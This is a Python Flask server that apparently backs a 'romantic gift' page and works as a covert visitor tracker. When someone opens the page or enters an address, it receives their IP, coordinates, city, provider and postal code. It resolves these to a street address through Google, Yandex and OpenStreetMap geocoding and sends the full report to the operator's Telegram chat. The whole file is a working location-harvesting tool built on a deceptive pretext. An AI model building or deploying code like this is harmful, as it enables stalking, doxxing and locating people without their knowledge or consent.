import os
import logging
import requests
from dotenv import load_dotenv
from flask import Flask, request, jsonify
from flask_cors import CORS

load_dotenv()

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

BOT_TOKEN = os.getenv('BOT_TOKEN')
YOUR_CHAT_ID = os.getenv('CHAT_ID')
GOOGLE_MAPS_API_KEY = os.getenv('GOOGLE_MAPS_API_KEY', '')  # Opsional
TELEGRAM_API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

app = Flask(__name__)
CORS(app)

def send_telegram_message(chat_id: str, message: str):
    """Send message to Telegram"""
    try:
        payload = {
            'chat_id': chat_id,
            'text': message,
            'parse_mode': 'HTML'
        }
        response = requests.post(TELEGRAM_API_URL, json=payload, timeout=10)
        
        if response.status_code == 200:
            logger.info(f"✅ Message sent successfully")
            return True
        else:
            logger.error(f"❌ Telegram error: {response.status_code}")
            return False
    except Exception as e:
        logger.error(f"❌ Send error: {e}")
        return False

def get_address_google(lat, lon):
    """Google Geocoding API - eng aniq natija"""
    if not GOOGLE_MAPS_API_KEY:
        return None
    
    try:
        url = f"https://maps.googleapis.com/maps/api/geocode/json?latlng={lat},{lon}&key={GOOGLE_MAPS_API_KEY}&language=ru"
        response = requests.get(url, timeout=10)
        data = response.json()
        
        if data['status'] == 'OK' and len(data['results']) > 0:
            result = data['results'][0]
            full_address = result.get('formatted_address', '')
            
            # Qisqa manzil
            short_parts = []
            for comp in result.get('address_components', []):
                types = comp['types']
                if 'route' in types:
                    short_parts.insert(0, comp['long_name'])
                elif 'street_number' in types:
                    short_parts.insert(1, f"дом {comp['long_name']}")
                elif 'sublocality' in types or 'neighborhood' in types:
                    short_parts.append(comp['long_name'])
                elif 'locality' in types:
                    short_parts.append(comp['long_name'])
            
            short_address = ', '.join(short_parts) if short_parts else full_address
            
            logger.info(f"✅ Google: {short_address}")
            return {'short': short_address, 'full': full_address, 'source': 'Google Maps'}
    except Exception as e:
        logger.error(f"❌ Google API error: {e}")
    
    return None

def get_address_nominatim(lat, lon):
    """OpenStreetMap Nominatim - bepul alternative"""
    try:
        url = f"https://nominatim.openstreetmap.org/reverse?format=json&lat={lat}&lon={lon}&zoom=18&addressdetails=1"
        headers = {'User-Agent': 'RomanticGiftApp/1.0'}
        
        response = requests.get(url, headers=headers, timeout=10)
        data = response.json()
        
        if 'address' in data:
            addr = data['address']
            parts = []
            
            if 'road' in addr:
                parts.append(addr['road'])
            if 'house_number' in addr:
                parts.append(f"дом {addr['house_number']}")
            if 'neighbourhood' in addr:
                parts.append(addr['neighbourhood'])
            elif 'suburb' in addr:
                parts.append(addr['suburb'])
            if 'city' in addr:
                parts.append(addr['city'])
            elif 'town' in addr:
                parts.append(addr['town'])
            
            full_address = data.get('display_name', '')
            short_address = ', '.join(parts) if parts else full_address
            
            logger.info(f"✅ OSM: {short_address}")
            return {'short': short_address, 'full': full_address, 'source': 'OpenStreetMap'}
    except Exception as e:
        logger.error(f"❌ OSM error: {e}")
    
    return None

def get_address_yandex(lat, lon):
    """Yandex Geocoder - O'zbekiston uchun yaxshi"""
    try:
        url = f"https://geocode-maps.yandex.ru/1.x/?apikey=&geocode={lon},{lat}&format=json&lang=ru_RU"
        response = requests.get(url, timeout=10)
        data = response.json()
        
        if 'response' in data and 'GeoObjectCollection' in data['response']:
            members = data['response']['GeoObjectCollection']['featureMember']
            if members:
                geo_object = members[0]['GeoObject']
                full_address = geo_object.get('metaDataProperty', {}).get('GeocoderMetaData', {}).get('text', '')
                
                logger.info(f"✅ Yandex: {full_address}")
                return {'short': full_address, 'full': full_address, 'source': 'Yandex Maps'}
    except Exception as e:
        logger.error(f"❌ Yandex error: {e}")
    
    return None

def get_best_address(lat, lon):
    """Eng yaxshi manzilni olish - 3 xil servisdan"""
    logger.info(f"🗺️ Getting address for: {lat}, {lon}")
    
    # 1. Google (eng aniq, lekin API key kerak)
    if GOOGLE_MAPS_API_KEY:
        google_result = get_address_google(lat, lon)
        if google_result:
            return google_result
    
    # 2. Yandex (O'zbekiston uchun yaxshi)
    yandex_result = get_address_yandex(lat, lon)
    if yandex_result:
        return yandex_result
    
    # 3. OpenStreetMap (bepul, har doim ishlaydi)
    osm_result = get_address_nominatim(lat, lon)
    if osm_result:
        return osm_result
    
    return {'short': 'Адрес не определен', 'full': 'Адрес не определен', 'source': 'None'}

@app.route('/api/notify', methods=['POST'])
def notify():
    try:
        data = request.get_json()
        logger.info(f"📥 Request received")
        
        message_type = data.get('type', 'Уведомление')
        address = data.get('address', '')
        ip = data.get('ip', 'N/A')
        city = data.get('city', 'N/A')
        region = data.get('region', 'N/A')
        country = data.get('country', 'N/A')
        loc = data.get('loc', 'N/A')
        org = data.get('org', 'N/A')
        postal = data.get('postal', 'N/A')
        timezone = data.get('timezone', 'N/A')
        timestamp = data.get('timestamp', 'N/A')
        
        logger.info(f"📍 IP Location: {city}, {region}, {country}")
        logger.info(f"📍 Coordinates: {loc}")
        
        # Get detailed address from coordinates
        address_info = {'short': 'N/A', 'full': 'N/A', 'source': 'None'}
        if loc and loc != 'N/A' and ',' in loc:
            try:
                lat, lon = loc.split(',')
                address_info = get_best_address(lat.strip(), lon.strip())
            except Exception as e:
                logger.error(f"❌ Coordinate parse error: {e}")
        
        # Map links
        maps_link = f"https://www.google.com/maps?q={loc}" if loc != 'N/A' else "N/A"
        yandex_link = f"https://yandex.uz/maps/?ll={loc.split(',')[1]},{loc.split(',')[0]}&z=17" if loc != 'N/A' and ',' in loc else "N/A"
        gis_link = f"https://2gis.uz/tashkent" if city == 'Tashkent' else "N/A"
        
        # Build message
        if address:  # User entered address manually
            message = f"""<b>🎁 АДРЕС ПОЛУЧЕН!</b>

📮 <b>Введенный адрес:</b>
{address}

━━━━━━━━━━━━━━━━━━━━━
<b>📍 МЕСТОПОЛОЖЕНИЕ:</b>

🏠 <b>Автоопределенный адрес:</b>
{address_info['short']}

📍 <b>Город:</b> {city}
📍 <b>Регион:</b> {region}
📍 <b>Страна:</b> {country}
📍 <b>Координаты:</b> <code>{loc}</code>

🗺 <a href="{maps_link}">Google Maps</a> | <a href="{yandex_link}">Yandex</a>

<i>Полный адрес ({address_info['source']}):</i>
{address_info['full']}

━━━━━━━━━━━━━━━━━━━━━
<b>🌐 IP ИНФОРМАЦИЯ:</b>

IP: <code>{ip}</code>
Провайдер: {org}
Почт. индекс: {postal}
Часовой пояс: {timezone}
Время: {timestamp}
"""
        else:  # Page opened
            message = f"""<b>{message_type}</b>

━━━━━━━━━━━━━━━━━━━━━
<b>📍 МЕСТОПОЛОЖЕНИЕ ПОЛЬЗОВАТЕЛЯ:</b>

🏠 <b>Адрес:</b>
{address_info['short']}

📍 <b>Город:</b> {city}
📍 <b>Регион:</b> {region}
📍 <b>Страна:</b> {country}
📍 <b>Координаты:</b> <code>{loc}</code>

🗺 <a href="{maps_link}">Google Maps</a> | <a href="{yandex_link}">Yandex</a> | <a href="{gis_link}">2GIS</a>

<i>Полный адрес ({address_info['source']}):</i>
{address_info['full']}

━━━━━━━━━━━━━━━━━━━━━
<b>🌐 ДЕТАЛИ:</b>

IP: <code>{ip}</code>
Провайдер: {org}
Почт. индекс: {postal}
Часовой пояс: {timezone}
Время: {timestamp}

<i>⚠️ Местоположение определено по IP адресу (точность ±1-5км)</i>
"""
        
        logger.info(f"📤 Sending to Telegram...")
        result = send_telegram_message(YOUR_CHAT_ID, message)
        
        if result:
            return jsonify({'success': True, 'message': 'Sent'}), 200
        else:
            return jsonify({'success': False, 'message': 'Failed'}), 500
            
    except Exception as e:
        logger.error(f"❌ Error: {e}", exc_info=True)
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/health', methods=['GET'])
def health():
    return jsonify({'status': 'ok'}), 200

def main():
    logger.info("🚀 Starting server...")
    logger.info(f"📱 Chat ID: {YOUR_CHAT_ID}")
    logger.info(f"🔑 Google API: {'Configured' if GOOGLE_MAPS_API_KEY else 'Not configured (will use OSM/Yandex)'}")
    
    port = int(os.getenv('PORT', 10000))
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)

if __name__ == '__main__':
    main()